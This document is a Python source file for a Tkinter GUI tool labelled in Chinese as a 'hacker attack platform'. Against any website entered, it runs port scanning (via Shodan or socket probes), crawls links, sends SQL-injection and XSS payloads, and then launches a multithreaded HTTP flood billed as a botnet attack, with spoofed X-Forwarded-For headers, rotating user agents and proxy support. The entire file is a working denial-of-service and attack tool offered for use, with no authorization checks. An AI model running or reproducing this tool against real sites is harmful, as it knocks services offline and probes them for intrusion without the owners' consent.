import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
import requests
from bs4 import BeautifulSoup
import threading
import time
import random
import urllib.parse
import queue
import json
import shodan
import socket
import websocket
from http.client import RemoteDisconnected
import os
from datetime import datetime

class HTTPFloodGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("黑客攻击平台 v2.0")
        self.root.geometry("800x700")
        self.root.configure(bg="#000")

        # 黑客风格界面
        self.label = tk.Label(root, text="黑客攻击平台 v2.0", font=("Courier", 20), fg="#0f0", bg="#000")
        self.label.pack(pady=10)

        # 输入框框架
        input_frame = tk.Frame(root, bg="#000")
        input_frame.pack(pady=5)

        self.url_label = tk.Label(input_frame, text="目标网站URL:", font=("Courier", 12), fg="#0f0", bg="#000")
        self.url_label.grid(row=0, column=0, sticky="e")
        self.url_entry = tk.Entry(input_frame, width=50, font=("Courier", 12), bg="#222", fg="#0f0", insertbackground="#0f0")
        self.url_entry.grid(row=0, column=1, padx=5)

        self.shodan_label = tk.Label(input_frame, text="Shodan API密钥 (可选):", font=("Courier", 12), fg="#0f0", bg="#000")
        self.shodan_label.grid(row=1, column=0, sticky="e")
        self.shodan_entry = tk.Entry(input_frame, width=50, font=("Courier", 12), bg="#222", fg="#0f0", insertbackground="#0f0")
        self.shodan_entry.grid(row=1, column=1, padx=5)

        self.threads_label = tk.Label(input_frame, text="线程数 (1-50):", font=("Courier", 12), fg="#0f0", bg="#000")
        self.threads_label.grid(row=2, column=0, sticky="e")
        self.threads_entry = tk.Entry(input_frame, width=10, font=("Courier", 12), bg="#222", fg="#0f0", insertbackground="#0f0")
        self.threads_entry.insert(0, "10")
        self.threads_entry.grid(row=2, column=1, sticky="w", padx=5)

        self.requests_label = tk.Label(input_frame, text="每线程请求数 (50-1000):", font=("Courier", 12), fg="#0f0", bg="#000")
        self.requests_label.grid(row=3, column=0, sticky="e")
        self.requests_entry = tk.Entry(input_frame, width=10, font=("Courier", 12), bg="#222", fg="#0f0", insertbackground="#0f0")
        self.requests_entry.insert(0, "100")
        self.requests_entry.grid(row=3, column=1, sticky="w", padx=5)

        self.duration_label = tk.Label(input_frame, text="持续时间 (秒, 10-300):", font=("Courier", 12), fg="#0f0", bg="#000")
        self.duration_label.grid(row=4, column=0, sticky="e")
        self.duration_entry = tk.Entry(input_frame, width=10, font=("Courier", 12), bg="#222", fg="#0f0", insertbackground="#0f0")
        self.duration_entry.insert(0, "60")
        self.duration_entry.grid(row=4, column=1, sticky="w", padx=5)
        
        # 代理设置
        self.proxy_var = tk.BooleanVar(value=True)  # 默认启用代理
        self.proxy_check = tk.Checkbutton(input_frame, text="启用代理", variable=self.proxy_var, 
                                        font=("Courier", 12), fg="#0f0", bg="#000", 
                                        selectcolor="#222", activebackground="#000", activeforeground="#0f0")
        self.proxy_check.grid(row=5, column=0, sticky="e")
        
        proxy_frame = tk.Frame(input_frame, bg="#000")
        proxy_frame.grid(row=5, column=1, sticky="w", padx=5)
        
        self.proxy_entry = tk.Entry(proxy_frame, width=40, font=("Courier", 12), bg="#222", fg="#0f0", insertbackground="#0f0")
        self.proxy_entry.insert(0, "http://127.0.0.1:7890")
        self.proxy_entry.pack(side="left")

        # 按钮框架
        button_frame = tk.Frame(root, bg="#000")
        button_frame.pack(pady=10)
        self.start_button = tk.Button(button_frame, text="开始攻击", command=self.start_attack, font=("Courier", 12), bg="#0f0", fg="#000")
        self.start_button.pack(side="left", padx=5)
        self.stop_button = tk.Button(button_frame, text="停止攻击", command=self.stop_attack, font=("Courier", 12), bg="#f00", fg="#000", state="disabled")
        self.stop_button.pack(side="left", padx=5)

        # 日志区域
        self.output = scrolledtext.ScrolledText(root, width=80, height=25, font=("Courier", 10), bg="#222", fg="#0f0")
        self.output.pack(pady=10)

        self.queue = queue.Queue()
        self.stop_event = threading.Event()
        self.ws = None
        self.connect_websocket()

    def connect_websocket(self):
        def on_open(ws):
            self.log("[*] WebSocket连接成功")
            ws.send(json.dumps({
                'type': 'connect',
                'data': {'tool': 'HTTPFloodGUI', 'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')}
            }))
            # 启动心跳
            def heartbeat():
                while ws.sock:
                    try:
                        ws.send(json.dumps({'type': 'heartbeat', 'data': 'ping'}))
                        time.sleep(30)
                    except:
                        break
            threading.Thread(target=heartbeat, daemon=True).start()

        def on_error(ws, error):
            self.log(f"[!] WebSocket错误: {error}")

        def on_close(ws, close_status_code, close_msg):
            self.log("[!] WebSocket断开")

        self.ws = websocket.WebSocketApp("ws://localhost:8765",  # 替换为你的WebSocket地址
                                         on_open=on_open, on_error=on_error, on_close=on_close)
        threading.Thread(target=self.ws.run_forever, daemon=True).start()

    def log(self, message):
        self.output.insert(tk.END, f"{time.strftime('%H:%M:%S')} {message}\n")
        self.output.see(tk.END)
        self.root.update()
        if self.ws and self.ws.sock:
            try:
                self.ws.send(json.dumps({'type': 'log', 'data': message}))
            except:
                pass

    def crawl_target(self, url, max_links=50, depth=1):
        self.log(f"[*] 爬取 {url} (深度 {depth}) ...")
        links = set()
        if depth < 1:
            return links
        try:
            response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
            if response.status_code != 200:
                self.log(f"[!] 爬取失败，状态码: {response.status_code}")
                return links
            soup = BeautifulSoup(response.text, 'html.parser')
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                full_url = urllib.parse.urljoin(url, href)
                if full_url.startswith(('http://', 'https://')) and len(links) < max_links:
                    links.add(full_url)
                    if depth > 1:
                        sub_links = self.crawl_target(full_url, max_links - len(links), depth - 1)
                        links.update(sub_links)
            self.log(f"[+] 发现 {len(links)} 个链接: {', '.join(sorted(links))}")
            
            # 保存链接到文件
            if links:
                try:
                    # 创建结果目录
                    results_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "爬取结果")
                    if not os.path.exists(results_dir):
                        os.makedirs(results_dir)
                    
                    # 从URL解析域名作为文件名的一部分
                    parsed_url = urllib.parse.urlparse(url)
                    domain = parsed_url.netloc.replace(":", "_").replace(".", "_")
                    
                    # 添加时间戳到文件名
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"{domain}_{timestamp}.txt"
                    filepath = os.path.join(results_dir, filename)
                    
                    # 写入文件
                    with open(filepath, "w", encoding="utf-8") as f:
                        f.write(f"# 爬取目标: {url}\n")
                        f.write(f"# 爬取时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"# 爬取深度: {depth}\n")
                        f.write(f"# 发现链接数: {len(links)}\n\n")
                        for link in sorted(links):
                            f.write(f"{link}\n")
                    
                    self.log(f"[+] 爬取结果已保存到: {filepath}")
                except Exception as e:
                    self.log(f"[!] 保存爬取结果失败: {e}")
            
        except Exception as e:
            self.log(f"[!] 爬取错误: {e}")
        return links

    def scan_ports(self, host, shodan_api_key):
        self.log(f"[*] 扫描 {host} 的端口 ...")
        ports = []
        try:
            if shodan_api_key:
                try:
                    api = shodan.Shodan(shodan_api_key)
                    result = api.host(host)
                    ports = sorted([port for port in result.get('ports', [])])
                    self.log(f"[+] Shodan发现端口: {ports}")
                except shodan.APIError as e:
                    self.log(f"[!] Shodan API错误: {e}")
            if not ports:  # 本地扫描作为备用
                common_ports = [21, 22, 23, 25, 80, 110, 143, 443, 3306, 8080]
                for port in common_ports:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((host, port))
                    if result == 0:
                        ports.append(port)
                    sock.close()
                self.log(f"[+] 本地扫描发现端口: {ports}")
        except Exception as e:
            self.log(f"[!] 端口扫描错误: {e}")
        return ports

    def test_sql_injection(self, url):
        self.log(f"[*] 测试 {url} 的SQL注入漏洞 ...")
        payloads = [
            "id=1'", "id=1--", "id=1/**/or/**/1=1",
            "id=1' OR '1'='1", "id=1' UNION SELECT NULL--"
        ]
        for payload in payloads:
            test_url = f"{url}?{payload}" if '?' in url else f"{url}?id={payload}"
            try:
                response = requests.get(test_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if any(err in response.text.lower() for err in ["mysql", "sql", "database", "syntax error"]):
                    self.log(f"[+] 可能存在SQL注入: {test_url}")
                    return True
                else:
                    self.log(f"[-] 未发现SQL注入: {test_url}")
            except Exception as e:
                self.log(f"[!] SQL注入测试错误: {e}")
        return False

    def test_xss(self, url):
        self.log(f"[*] 测试 {url} 的XSS漏洞 ...")
        payloads = [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '" onmouseover="alert(1)"',
            '<img src="javascript:alert(1)">'
        ]
        for payload in payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?q={encoded_payload}" if '?' in url else f"{url}?search={encoded_payload}"
            try:
                response = requests.get(test_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if payload in response.text:
                    self.log(f"[+] 可能存在XSS漏洞: {test_url}")
                    return True
                else:
                    self.log(f"[-] 未发现XSS漏洞: {test_url}")
            except Exception as e:
                self.log(f"[!] XSS测试错误: {e}")
        return False

    def attack_target(self, url, request_count, proxy=None):
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15'
            ]),
            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        }
        success = 0
        for _ in range(request_count):
            if self.stop_event.is_set():
                break
            try:
                if random.random() > 0.3:
                    response = requests.get(url, headers=headers, proxies=proxy, timeout=3)
                else:
                    response = requests.post(url, headers=headers, data={'test': '1'}, proxies=proxy, timeout=3)
                success += 1
                self.queue.put((url, response.status_code))
            except (requests.exceptions.RequestException, RemoteDisconnected):
                self.queue.put((url, '失败'))
        self.queue.put((url, f"完成: {success}/{request_count}"))

    def run_attack(self):
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")
        self.stop_event.clear()
        target_url = self.url_entry.get().strip()
        shodan_api_key = self.shodan_entry.get().strip()

        # 验证URL
        if not target_url.startswith(('http://', 'https://')):
            messagebox.showerror("错误", "请输入有效的URL（以http://或https://开头）！")
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            return

        try:
            threads = min(max(int(self.threads_entry.get()), 1), 50)
            requests_per_thread = min(max(int(self.requests_entry.get()), 50), 1000)
            duration = min(max(int(self.duration_entry.get()), 10), 300)
        except ValueError:
            messagebox.showerror("错误", "请输入有效的数字！")
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            return

        # 代理支持
        proxy = None
        if self.proxy_var.get():
            proxy_url = self.proxy_entry.get().strip()
            if proxy_url:
                self.log(f"[*] 使用代理: {proxy_url}")
                proxy = {'http': proxy_url, 'https': proxy_url}
            else:
                self.log("[!] 代理地址为空，不使用代理")
        else:
            self.log("[*] 不使用代理")

        # 解析主机名
        parsed = urllib.parse.urlparse(target_url)
        host = parsed.hostname

        # 端口扫描
        ports = self.scan_ports(host, shodan_api_key)
        if ports:
            self.log(f"[+] 开放端口: {ports}")
        else:
            self.log("[-] 未发现开放端口")

        # 漏洞测试
        self.test_sql_injection(target_url)
        self.test_xss(target_url)

        # 爬取目标
        targets = self.crawl_target(target_url, depth=2)
        if not targets:
            targets = {target_url}
        else:
            targets.add(target_url)

        # 僵尸网络模拟攻击
        self.log(f"[*] 启动僵尸网络攻击: 目标={len(targets)}个, 线程={threads}, 每线程请求={requests_per_thread}, 持续={duration}s")
        thread_list = []
        for target in targets:
            for _ in range(threads // len(targets) or 1):
                t = threading.Thread(target=self.attack_target, args=(target, requests_per_thread, proxy))
                t.start()
                thread_list.append(t)

        def update_output():
            start_time = time.time()
            while any(t.is_alive() for t in thread_list) and (time.time() - start_time) < duration and not self.stop_event.is_set():
                try:
                    while True:
                        url, status = self.queue.get_nowait()
                        self.log(f"[+] {url}: {status}")
                except queue.Empty:
                    pass
                self.root.update()
                time.sleep(0.1)
            self.stop_event.set()
            for t in thread_list:
                t.join()
            self.log("[*] 攻击结束")
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")

        threading.Thread(target=update_output, daemon=True).start()

    def start_attack(self):
        threading.Thread(target=self.run_attack, daemon=True).start()

    def stop_attack(self):
        self.stop_event.set()
        self.log("[*] 正在停止攻击 ...")

if __name__ == "__main__":
    root = tk.Tk()
    app = HTTPFloodGUI(root)

    root.mainloop()